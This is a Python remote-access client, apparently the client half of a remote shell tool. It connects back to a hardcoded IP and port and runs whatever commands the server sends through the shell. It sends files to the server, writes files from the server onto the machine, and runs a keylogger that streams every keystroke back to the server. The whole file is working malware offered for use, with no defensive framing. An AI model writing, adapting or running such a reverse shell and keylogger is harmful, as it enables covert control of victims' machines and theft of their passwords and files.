#!/usr/bin/python
# Remote Shell Client

# Description:
# This script serves as the client-side counterpart to the Remote Shell server. It connects to the server
# and allows the execution of commands, file operations, and includes a keylogger feature.


try:
    import socket
    import threading
    import time
    import json
    import subprocess
    import os
    from pynput import keyboard
except ModuleNotFoundError:
    from subprocess import call
    modules = ["pynput"]
    call("pip install " + ' '.join(modules), shell=True)


class RemoteControl:
    def __init__(self, l_host, l_port):
        self.l_host = l_host
        self.l_port = l_port
        self.server_socket = None
        self.keylogger_active = False
        self.active_keylogger_listener = False
        self.connection_died = 0
        self.timeout = 0
        self.json_receive_timeout = 0

    def connect_to_server(self):
        while True:
            try:
                self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.server_socket.connect((self.l_host, self.l_port))
                print("[+] Connected!")
                break
            except TimeoutError:
                print('[!] Connection timed out, retrying in 10 seconds...')
                time.sleep(10)
            except Exception as e_connect:
                print(f'[!] An error occurred: {e_connect}')
                time.sleep(10)

    def capture_keys(self, key):
        if self.keylogger_active:
            try:
                # [*] check 'vk': 65437 bug
                # key_attributes = dir(key)
                # for attributes in key_attributes:
                #     if not callable(getattr(key, attributes)):
                #         pr = getattr(key, attributes)
                #         if isinstance(pr, dict):
                #             print("\n", pr)
                if key == keyboard.Key.space:
                    char = " "
                elif key == keyboard.Key.enter:
                    char = "\n"
                elif hasattr(key, 'char'):
                    char = key.char
                    # There's a bug when pressing numpy 5 on linux systems
                    # {'vk': 65437, 'char': None, 'is_dead': False, 'combining': None, '_symbol': None}
                    if key.vk == 65437:
                        char = "5"
                else:
                    char = getattr(key, 'char')
                print(char, end='', flush=True)
                self.server_socket.send(char.encode())
            except Exception as e_cap_key:
                print(f"\ndef [capture_keys] Error:\n{e_cap_key}")
        else:
            listener.stop()

    def send_data_as_json(self, data):
        json_data = json.dumps(data)
        self.server_socket.send(json_data.encode())

    def receive_data_as_json(self):
        received_data = ''
        while True:
            if self.json_receive_timeout == 25:
                break
            try:
                received_data += self.server_socket.recv(1024).decode().rstrip()
                return json.loads(received_data)
            except json.JSONDecodeError:
                self.json_receive_timeout += 1
                continue

    def upload_file(self, file_name):
        try:
            with open(file_name, 'rb') as up_file:
                self.server_socket.send(up_file.read())
        except Exception as e_upload_file:
            print(f"Error uploading file: {e_upload_file}")

    def download_file(self, file_name):
        try:
            with open(file_name, 'wb') as down_file:
                self.server_socket.settimeout(1)
                while True:
                    chunk = self.server_socket.recv(1024)
                    if not chunk:
                        break
                    down_file.write(chunk)
        except socket.timeout:
            pass  # Ignore timeouts
        except Exception as e_download_file:
            print(f"Error downloading file: {e_download_file}")
        finally:
            self.server_socket.settimeout(None)

    def execute_command(self, command):
        # Execute command logic
        pass

    def main_loop(self):
        while True:
            try:
                command = self.receive_data_as_json()
                if command == 'quit':
                    self.connection_died = 1
                    break
                elif command == '':
                    # connection lost, auto exit
                    self.timeout += 1
                    time.sleep(0.25)
                    if self.timeout == 15:
                        self.connection_died = 1
                        break
                elif command == 'clear':
                    pass

                elif command[:3] == 'cd ':
                    os.chdir(command[3:])

                elif command == 'keyscan_start':
                    self.keylogger_active = True
                    self.active_keylogger_listener = True
                    print("Keylogger started.")
                elif command == 'keyscan_stop':
                    self.keylogger_active = False
                    print("Keylogger stopped.")

                elif command.startswith('download'):
                    # upload to server
                    self.upload_file(command[9:])
                elif command.startswith('upload'):
                    # download from server
                    self.download_file(command[7:])

                else:
                    # Execute the command with shell and capture the output
                    execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                               stdin=subprocess.PIPE)
                    result = execute.stdout.read() + execute.stderr.read()
                    result = result.decode()
                    # Send shell result to server
                    time.sleep(1)
                    self.send_data_as_json(result)

            except Exception as e_main:
                print(f"\ndef[Main] Error:\n{e_main}")
                self.connection_died = 1
                break


if __name__ == "__main__":
    server = RemoteControl('192.168.1.231', 5555)
    server.connect_to_server()

    main_thread = threading.Thread(target=server.main_loop)
    main_thread.start()

    while True:
        try:
            if server.connection_died == 1:
                print("\n[!] Connection died. Exiting in 3 seconds...")
                time.sleep(3)
                exit(0)

            if server.active_keylogger_listener:
                while server.keylogger_active:
                    listener = keyboard.Listener(on_press=server.capture_keys)
                    listener.start()
                    server.active_keylogger_listener = False
                    break
            time.sleep(1)

        except KeyboardInterrupt:
            continue
        except Exception as e_main_loop:
            print(f"__main__ [Main loop]:\n{e_main_loop}")
            exit(0)
